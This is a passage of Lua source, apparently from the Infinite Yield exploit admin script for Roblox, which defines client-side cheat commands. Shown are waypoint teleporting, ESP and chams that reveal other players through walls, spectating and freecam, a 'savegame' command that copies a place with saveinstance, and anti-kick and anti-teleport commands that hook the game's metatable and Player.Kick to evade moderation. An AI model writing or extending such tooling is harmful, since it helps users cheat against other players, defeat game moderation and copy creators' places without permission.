	end)

	swimming = false
	addcmd('swim',{},function(args, speaker)
		workspace.Gravity = 0
		local function swimDied()
			workspace.Gravity = 198.2
			swimming = false
		end
		gravReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(swimDied)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
		swimming = true
	end)

	addcmd('unswim',{'noswim'},function(args, speaker)
		workspace.Gravity = 198.2
		swimming = false
		if gravReset then
			gravReset:Disconnect()
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	end)

	addcmd('toggleswim',{},function(args, speaker)
		if swimming then
			execCmd('unswim')
		else
			execCmd('swim')
		end
	end)

	addcmd('setwaypoint',{'swp','setwp','spos','saveposition','savepos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			local torso = getRoot(speaker.Character)
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('waypointpos',{'wpp','setwaypointposition','setpos','setwaypoint','setwaypointpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	waypointParts = {}
	addcmd('showwaypoints',{'showwp','showwps'},function(args, speaker)
		execCmd('hidewaypoints')
		wait()
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			local part = Instance.new("Part")
			part.Size = Vector3.new(5,5,5)
			part.CFrame = CFrame.new(x,y,z)
			part.Parent = workspace
			part.Anchored = true
			part.CanCollide = false
			table.insert(waypointParts,part)
			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = part
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = part.Size
			view.Parent = part
		end
		for i,v in pairs(pWayPoints) do
			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = pWayPoints[i].COORD[1]
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = pWayPoints[i].COORD[1].Size
			view.Parent = pWayPoints[i].COORD[1]
			table.insert(waypointParts,view)
		end
	end)

	addcmd('hidewaypoints',{'hidewp','hidewps'},function(args, speaker)
		for i,v in pairs(waypointParts) do
			v:Destroy()
		end
		waypointParts = {}
	end)

	addcmd('waypoint',{'wp','lpos','loadposition','loadpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					getRoot(speaker.Character).CFrame = CFrame.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					getRoot(speaker.Character).CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	tweenSpeed = 1
	addcmd('tweenspeed',{'tspeed'},function(args, speaker)
		local newSpeed = args[1] or 1
		if tonumber(newSpeed) then
			tweenSpeed = tonumber(newSpeed)
		end
	end)

	addcmd('tweenwaypoint',{'twp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)}):Play()
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)}):Play()
				end
			end
		end
	end)

	addcmd('walktowaypoint',{'wtwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	addcmd('deletewaypoint',{'dwp','dpos','deleteposition','deletepos'},function(args, speaker)
		for i,v in pairs(WayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(WayPoints, i)
			end
		end
		if AllWaypoints ~= nil and #AllWaypoints > 0 then
			for i,v in pairs(AllWaypoints) do
				if v.NAME:lower() == tostring(getstring(1)):lower() then
					if not v.GAME or v.GAME == game.PlaceId then
						table.remove(AllWaypoints, i)
					end
				end
			end
		end
		for i,v in pairs(pWayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(pWayPoints, i)
			end
		end
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('clearwaypoints',{'cwp','clearpositions','cpos','clearpos'},function(args, speaker)
		WayPoints = {}
		pWayPoints = {}
		refreshwaypoints()
		updatesaves()
		AllWaypoints = {}
		notify('Modified Waypoints','Removed all waypoints')
	end)

	addcmd('enable',{},function(args, speaker)
		if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', true)
		elseif args[1]:lower() == 'playerlist' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', true)
		elseif args[1]:lower() == 'chat' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
		elseif args[1]:lower() == 'all' then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
		end
	end)

	addcmd('disable',{},function(args, speaker)
		if args[1]:lower() == 'inventory' or args[1]:lower() == 'backpack' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Backpack', false)
		elseif args[1]:lower() == 'playerlist' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', false)
		elseif args[1]:lower() == 'chat' then
			game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', false)
		elseif args[1]:lower() == 'all' then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
		end
	end)

	local invisGUIS = {}
	addcmd('showguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
				v.Visible = true
				if not FindInTable(invisGUIS,v) then
					table.insert(invisGUIS,v)
				end
			end
		end
	end)

	addcmd('unshowguis',{},function(args, speaker)
		for i,v in pairs(invisGUIS) do
			v.Visible = false
		end
		invisGUIS = {}
	end)

	local hiddenGUIS = {}
	addcmd('hideguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
				v.Visible = false
				if not FindInTable(hiddenGUIS,v) then
					table.insert(hiddenGUIS,v)
				end
			end
		end
	end)

	addcmd('unhideguis',{},function(args, speaker)
		for i,v in pairs(hiddenGUIS) do
			v.Visible = true
		end
		hiddenGUIS = {}
	end)

	function deleteGuisAtPos()
		pcall(function()
			local guisAtPosition = game.Players.LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
			for _, gui in pairs(guisAtPosition) do
				if gui.Visible == true then
					gui:Destroy()
				end
			end
		end)
	end

	local deleteGuiInput
	addcmd('guidelete',{},function(args, speaker)
		deleteGuiInput = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if input.KeyCode == Enum.KeyCode.Backspace then
					deleteGuisAtPos()
				end
			end
		end)
		notify('GUI Delete Enabled','Hover over a GUI and press backspace to delete it')
	end)

	addcmd('unguidelete',{'noguidelete'},function(args, speaker)
		if deleteGuiInput then deleteGuiInput:Disconnect() end
		notify('GUI Delete Disabled','GUI backspace delete has been disabled')
	end)

	local wasStayOpen = StayOpen
	addcmd('hideiy',{},function(args, speaker)
		wasStayOpen = StayOpen
		if StayOpen == true then StayOpen = false
			On.BackgroundTransparency = 1
		end
		minimizeNum = 0
		minimizeHolder()
		notify('IY Hidden','You can press the prefix key to access the command bar')
	end)

	addcmd('showiy',{},function(args, speaker)
		minimizeNum = -20
		if wasStayOpen then
			maximizeHolder()
			StayOpen = true
			On.BackgroundTransparency = 0
		else
			minimizeHolder()
		end
	end)

	addcmd('rec', {'record'}, function(args, speaker)
		return game:GetService("CoreGui"):ToggleRecording()
	end)

	addcmd('screenshot', {'scrnshot'}, function(args, speaker)
		return game:GetService("CoreGui"):TakeScreenshot()
	end)

	addcmd('togglefs', {'togglefullscreen'}, function(args, speaker)
		return game:GetService("GuiService"):ToggleFullscreen()
	end)

	addcmd('inspect', {'examine'}, function(args, speaker)
		local GuiService = game:GetService("GuiService")
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			GuiService:CloseInspectMenu()
			GuiService:InspectPlayerFromUserId(Players[v].UserId)
		end
	end)

	addcmd('savegame',{'saveplace'},function(args, speaker)
		if saveinstance then
			notify("Loading","Downloading game. This will take a while")
			if getsynasset then
				saveinstance()
			else
				saveinstance(game)
			end
			notify('Game Saved','Saved place to the workspace folder within your exploit folder.')
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing saveinstance)')
		end
	end)


	addcmd('clearerror',{'clearerrors'},function(args, speaker)
		game:GetService("GuiService"):ClearError()
	end)

	addcmd('clientantikick',{'antikick'},function(args, speaker)
		local mt = getrawmetatable(game)
		local old = mt.__namecall
		local protect = newcclosure or protect_function

		if not protect then
			notify("Incompatible Exploit Warning", "Your exploit does not support protection against stack trace errors, resulting to fallback function")
			protect = function(f) return f end
		end

		setreadonly(mt, false)
		mt.__namecall = protect(function(self, ...)
			local method = getnamecallmethod()
			if method == "Kick" then
				wait(9e9)
				return
			end
			return old(self, ...)
		end)
		hookfunction(Players.LocalPlayer.Kick,protect(function() wait(9e9) end))

		notify('Client Antikick','Client anti kick is now active (only effective on localscript kick)')
	end)

	allow_rj = true
	addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
		local TeleportService, tp, tptpi = game:GetService("TeleportService")
		tp = hookfunction(TeleportService.Teleport, function(id, ...)
			if allow_rj and id == game.Placeid then
				return tp(id, ...)
			end
			return wait(9e9)
		end)
		tptpi = hookfunction(TeleportService.TeleportToPlaceInstance, function(id, server, ...)
			if allow_rj and id == game.Placeid and server == game.JobId then
				return tp(id, server, ...)
			end
			return wait(9e9)
		end)

		notify('Client AntiTP','Client anti teleport is now active (only effective on localscript teleport)')
	end)

	addcmd('allowrejoin',{'allowrj'},function(args, speaker)
		if args[1] and args[1] == 'false' then
			allow_rj = false
			notify('Client AntiTP','Allow rejoin set to false')
		else
			allow_rj = true
			notify('Client AntiTP','Allow rejoin set to true')
		end
	end)

	addcmd('cancelteleport',{'canceltp'},function(args, speaker)
		game:GetService("TeleportService"):TeleportCancel()
	end)

	addcmd('volume',{'vol'},function(args, speaker)
		local level = args[1]/10
		UserSettings():GetService("UserGameSettings").MasterVolume = level
	end)

	addcmd('antilag',{'boostfps','lowgraphics'},function(args, speaker)
		workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
		workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
		workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
		workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").FogEnd = 9e9
		settings().Rendering.QualityLevel = 1
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
			elseif v:IsA("Decal") then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(0)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 1
				v.BlastRadius = 1
			end
		end
		for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
				v.Enabled = false
			end
		end
	end)

	addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
		if setfpscap and type(setfpscap) == "function" then
			local num = args[1] or 1e6
			if num == 'none' then
				return setfpscap(1e6)
			elseif num > 0 then
				return setfpscap(num)
			else
				return notify('Invalid argument', "Please provide a number above 0 or 'none'.")
			end
		else
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setfpscap)')
		end
	end)

	addcmd('notify',{},function(args, speaker)
		notify(getstring(1))
	end)

	addcmd('lastcommand',{'lastcmd'},function(args, speaker)
		if cmdHistory[1]:sub(1,11) ~= 'lastcommand' and cmdHistory[1]:sub(1,7) ~= 'lastcmd' then
			execCmd(cmdHistory[1])
		end
	end)

	addcmd('esp',{},function(args, speaker)
		if not CHMSenabled then
			ESPenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					ESP(v)
				end
			end
		else
			notify('ESP','Disable chams (nochams) before using esp')
		end
	end)

	addcmd('noesp',{'unesp'},function(args, speaker)
		ESPenabled = false
		for i,c in pairs(COREGUI:GetChildren()) do
			if string.sub(c.Name, -4) == '_ESP' then
				c:Destroy()
			end
		end
	end)

	local espParts = {}
	local partEspTrigger = nil
	function partAdded(part)
		if #espParts > 0 then
			if FindInTable(espParts,part.Name:lower()) then
				local a = Instance.new("BoxHandleAdornment")
				a.Name = part.Name:lower().."_PESP"
				a.Parent = part
				a.Adornee = part
				a.AlwaysOnTop = true
				a.ZIndex = 0
				a.Size = part.Size
				a.Transparency = 0.3
				a.Color = BrickColor.new("Lime green")
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
		end
	end

	addcmd('partesp',{},function(args, speaker)
		local partEspName = getstring(1):lower()
		if not FindInTable(espParts,partEspName) then
			table.insert(espParts,partEspName)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Name:lower() == partEspName then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = partEspName.."_PESP"
					a.Parent = v
					a.Adornee = v
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = v.Size
					a.Transparency = 0.3
					a.Color = BrickColor.new("Lime green")
				end
			end
		end
		if partEspTrigger == nil then
			partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
		end
	end)

	addcmd('unpartesp',{'nopartesp'},function(args, speaker)
		if args[1] then
			local partEspName = getstring(1):lower()
			if FindInTable(espParts,partEspName) then
				table.remove(espParts, GetInTable(espParts, partEspName))
			end
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name == partEspName..'_PESP' then
					v:Destroy()
				end
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
			espParts = {}
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name:sub(-5) == '_PESP' then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('chams',{},function(args, speaker)
		if not ESPenabled then
			CHMSenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					CHMS(v)
				end
			end
		else
			notify('Chams','Disable ESP (noesp) before using chams')
		end
	end)

	addcmd('nochams',{'unchams'},function(args, speaker)
		CHMSenabled = false
		for i,v in pairs(Players:GetChildren()) do
			local chmsplr = v
			for i,c in pairs(COREGUI:GetChildren()) do
				if c.Name == chmsplr.Name..'_CHMS' then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('locate',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			Locate(Players[v])
		end
	end)

	addcmd('nolocate',{'unlocate'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if args[1] then
			for i,v in pairs(players) do
				for i,c in pairs(COREGUI:GetChildren()) do
					if c.Name == Players[v].Name..'_LC' then
						c:Destroy()
					end
				end
			end
		else
			for i,c in pairs(COREGUI:GetChildren()) do
				if string.sub(c.Name, -3) == '_LC' then
					c:Destroy()
				end
			end
		end
	end)

	viewing = nil
	addcmd('view',{'spectate'},function(args, speaker)
		StopFreecam()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			viewing = Players[v]
			workspace.CurrentCamera.CameraSubject = viewing.Character
			notify('Spectate','Viewing ' .. Players[v].Name)
			local function viewDiedFunc()
				repeat wait() until Players[v].Character ~= nil and getRoot(Players[v].Character)
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewDied = Players[v].CharacterAdded:Connect(viewDiedFunc)
			local function viewChangedFunc()
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
		end
	end)

	addcmd('viewpart',{'viewp'},function(args, speaker)
		StopFreecam()
		if args[1] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					wait(0.1)
					workspace.CurrentCamera.CameraSubject = v
				end
			end
		end
	end)

	addcmd('unview',{'unspectate'},function(args, speaker)
		StopFreecam()
		if viewing ~= nil then
			viewing = nil
			notify('Spectate','View turned off')
		end
		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		workspace.CurrentCamera.CameraSubject = speaker.Character
	end)


	fcRunning = false
	local Camera = workspace.CurrentCamera
	workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local newCamera = workspace.CurrentCamera
		if newCamera then
			Camera = newCamera
		end
	end)

	local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

	Spring = {} do
		Spring.__index = Spring

		function Spring.new(freq, pos)
			local self = setmetatable({}, Spring)
			self.f = freq
			self.p = pos
			self.v = pos*0
			return self
		end

		function Spring:Update(dt, goal)
			local f = self.f*2*math.pi
			local p0 = self.p
			local v0 = self.v

			local offset = goal - p0
			local decay = math.exp(-f*dt)

			local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
			local v1 = (f*dt*(offset*f - v0) + v0)*decay

			self.p = p1
			self.v = v1

			return p1
		end

		function Spring:Reset(pos)
			self.p = pos
			self.v = pos*0
		end
	end

	local cameraPos = Vector3.new()
	local cameraRot = Vector2.new()

	local velSpring = Spring.new(5, Vector3.new())
	local panSpring = Spring.new(5, Vector2.new())

	Input = {} do

		keyboard = {
			W = 0,
			A = 0,
			S = 0,
			D = 0,
			E = 0,
			Q = 0,
			Up = 0,
			Down = 0,
			LeftShift = 0,
		}

		mouse = {
			Delta = Vector2.new(),
		}

		NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
		PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
		NAV_ADJ_SPEED = 0.75
		NAV_SHIFT_MUL = 0.25

		navSpeed = 1

		function Input.Vel(dt)
			navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

			local kKeyboard = Vector3.new(
				keyboard.D - keyboard.A,
				keyboard.E - keyboard.Q,
				keyboard.S - keyboard.W
			)*NAV_KEYBOARD_SPEED

			local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)

			return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
		end

		function Input.Pan(dt)
			local kMouse = mouse.Delta*PAN_MOUSE_SPEED
			mouse.Delta = Vector2.new()
			return kMouse
		end

		do
			function Keypress(action, state, input)
				keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end

			function MousePan(action, state, input)
				local delta = input.Delta
				mouse.Delta = Vector2.new(-delta.y, -delta.x)
				return Enum.ContextActionResult.Sink
			end

			function Zero(t)
				for k, v in pairs(t) do
					t[k] = v*0
				end
			end

			function Input.StartCapture()
				game:GetService("ContextActionService"):BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
				Enum.KeyCode.W,
				Enum.KeyCode.A,
				Enum.KeyCode.S,
				Enum.KeyCode.D,
				Enum.KeyCode.E,
				Enum.KeyCode.Q,
				Enum.KeyCode.Up,
				Enum.KeyCode.Down
				)
				game:GetService("ContextActionService"):BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
			end

			function Input.StopCapture()
				navSpeed = 1
				Zero(keyboard)
				Zero(mouse)
				game:GetService("ContextActionService"):UnbindAction("FreecamKeyboard")
				game:GetService("ContextActionService"):UnbindAction("FreecamMousePan")
			end
		end
	end

	function GetFocusDistance(cameraFrame)
		local znear = 0.1
		local viewport = Camera.ViewportSize
		local projy = 2*math.tan(cameraFov/2)
		local projx = viewport.x/viewport.y*projy
		local fx = cameraFrame.rightVector
		local fy = cameraFrame.upVector
		local fz = cameraFrame.lookVector

		local minVect = Vector3.new()
		local minDist = 512

		for x = 0, 1, 0.5 do
			for y = 0, 1, 0.5 do
				local cx = (x - 0.5)*projx
				local cy = (y - 0.5)*projy
				local offset = fx*cx - fy*cy + fz
				local origin = cameraFrame.p + offset*znear
				local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
				local dist = (hit - origin).magnitude
				if minDist > dist then
					minDist = dist
					minVect = offset.unit
				end
			end
		end

		return fz:Dot(minVect)*minDist
	end

	local function StepFreecam(dt)
		local vel = velSpring:Update(dt, Input.Vel(dt))
		local pan = panSpring:Update(dt, Input.Pan(dt))

		local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

		cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
		cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

		local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
		cameraPos = cameraCFrame.p

		Camera.CFrame = cameraCFrame
		Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
		Camera.FieldOfView = cameraFov
	end

	local PlayerState = {} do
		mouseBehavior = ""
		mouseIconEnabled = ""
		cameraType = ""
		cameraFocus = ""
		cameraCFrame = ""
		cameraFieldOfView = ""

		function PlayerState.Push()
			cameraFieldOfView = Camera.FieldOfView
			Camera.FieldOfView = 70

			cameraType = Camera.CameraType
			Camera.CameraType = Enum.CameraType.Custom

			cameraCFrame = Camera.CFrame
			cameraFocus = Camera.Focus

			mouseIconEnabled = UserInputService.MouseIconEnabled
			UserInputService.MouseIconEnabled = true

			mouseBehavior = UserInputService.MouseBehavior
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end

		function PlayerState.Pop()
			Camera.FieldOfView = 70

			Camera.CameraType = cameraType
			cameraType = nil

			Camera.CFrame = cameraCFrame
			cameraCFrame = nil

			Camera.Focus = cameraFocus
			cameraFocus = nil

			UserInputService.MouseIconEnabled = mouseIconEnabled
			mouseIconEnabled = nil

			UserInputService.MouseBehavior = mouseBehavior
			mouseBehavior = nil
		end
	end

	function StartFreecam(pos)
		if fcRunning then
			StopFreecam()
		end
		local cameraCFrame = Camera.CFrame
		if pos then
			cameraCFrame = pos
		end
		cameraRot = Vector2.new()
		cameraPos = cameraCFrame.p
		cameraFov = Camera.FieldOfView

		velSpring:Reset(Vector3.new())
		panSpring:Reset(Vector2.new())

		PlayerState.Push()
		game:GetService("RunService"):BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
		Input.StartCapture()
		fcRunning = true
	end

	function StopFreecam()
		if not fcRunning then return end
		Input.StopCapture()
		game:GetService("RunService"):UnbindFromRenderStep("Freecam")
		PlayerState.Pop()
		workspace.Camera.FieldOfView = 70
		fcRunning = false
	end

	addcmd('freecam',{'fc'},function(args, speaker)
		StartFreecam()
	end)

	addcmd('freecampos',{'fcpos','fcp','freecamposition','fcposition'},function(args, speaker)
		if not args[1] then return end
		local freecamPos = CFrame.new(args[1],args[2],args[3])
		StartFreecam(freecamPos)
	end)

	addcmd('freecamwaypoint',{'fcwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(x,y,z))
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(pWayPoints[i].COORD[1].Position))
				end
			end
		end
	end)

	addcmd('freecamgoto',{'fcgoto','freecamtp','fctp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
